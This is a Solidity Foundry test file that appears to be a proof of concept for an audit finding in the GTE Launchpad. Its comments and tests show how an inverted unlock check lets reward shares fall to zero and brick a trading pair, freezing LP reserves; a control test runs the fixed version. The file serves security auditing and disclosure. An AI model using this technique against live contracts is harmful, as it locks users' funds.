// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    ExploitControl,
    Distributor,
    GTELaunchpadV2Pair,
    MiniToken,
    IERC20Like
} from "./64855-h-07-total-reward-shares-for-token-can-reach-zero-after-unlo.sol";

// GTE Launchpad H-07: after unlock(), if every bonding fee-share holder transfers
// their launch tokens away, Distributor.totalShares reaches 0 while the pair's
// rewards pool stays active (LaunchToken.sol:147 has an inverted `!unlocked`, so
// `_endRewards()` is SKIPPED post-unlock). Any pair op that routes through
// `_update` with leftover accrued fees then calls Distributor.addRewards, which
// reverts with NoSharesToIncentivize (Distributor.sol:119) -> the pair is bricked
// and LPs can never withdraw their reserves.
contract GTEBrickedPairTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function setUp() public {
        // Deterministic, non-zero base time so the pair's timeElapsed math is clean.
        vm.warp(1_000_000);
    }

    function test_pairBricked_LPfundsFrozen() public {
        Exploit e = new Exploit(); // deploy + bond + unlock + seed LP + accrue fees (block T0)

        // Preconditions established at deploy: shares > 0, accrued launchpad fees > 0.
        assertEq(e.currentShares(), 100 ether, "shares bonded at deploy");
        assertEq(e.pair().accruedLaunchpadFee0(), 1 ether, "launchpad fees accrued");

        // Advance to a later block so the pair's `_update` distribution branch fires.
        vm.warp(block.timestamp + 1 days);

        e.run();

        // HARM: the pair is bricked. burn() reverted; the LP's reserves are frozen.
        assertTrue(e.burnReverted(), "burn should have reverted (pair bricked)");
        assertEq(e.currentShares(), 0, "totalShares reached zero after unlock");

        // 1000e18 token0 + 1000e18 token1 of LP reserves permanently locked in the pair.
        assertEq(e.lockedReserves(), 2000 ether, "frozen LP reserves magnitude");
        MiniToken marker = e.marker();
        assertEq(marker.balanceOf(SINK), 2000 ether, "marker records frozen LP reserves at SINK");

        // Real reserves truly stuck: the pair still holds both tokens; the LP got nothing.
        assertEq(IERC20Like(e.launchToken()).balanceOf(address(e.pair())), 1000 ether, "token0 stuck in pair");
        assertEq(e.quote().balanceOf(address(e.pair())), 1000 ether, "token1 stuck in pair");
    }

    function test_preciseRevert_NoSharesToIncentivize() public {
        Exploit e = new Exploit();
        vm.warp(block.timestamp + 1 days);

        e.dumpShares(); // drive totalShares -> 0 (buggy: _endRewards skipped)
        assertEq(e.currentShares(), 0, "shares zeroed");
        assertEq(e.pair().rewardsPoolActive(), 1, "rewards pool still ACTIVE post-unlock (bug)");

        e.sendLpToPair();

        // The pair op reverts with the exact Distributor guard.
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        e.callBurn();
    }

    function test_control_fixedCondition_burnSucceeds() public {
        ExploitControl c = new ExploitControl(); // same scenario, FIXED `&& unlocked`
        assertEq(c.currentShares(), 100 ether, "shares bonded");
        vm.warp(block.timestamp + 1 days);

        c.run();

        // With the fix, dumping shares deactivates the pool, so burn succeeds and
        // the LP withdraws ~1000e18 of each reserve token.
        assertEq(c.currentShares(), 0, "shares zeroed");
        assertEq(c.pair().rewardsPoolActive(), 0, "pool deactivated by the fix");
        assertGt(c.lpWithdrawn0(), 999 ether, "LP withdrew token0");
        assertGt(c.lpWithdrawn1(), 999 ether, "LP withdrew token1");
        // Sanity: the LP actually received the tokens the buggy path froze.
        assertGt(IERC20Like(c.launchToken()).balanceOf(address(c)), 999 ether, "LP holds withdrawn token0");
        assertGt(c.quote().balanceOf(address(c)), 999 ether, "LP holds withdrawn token1");
    }
}
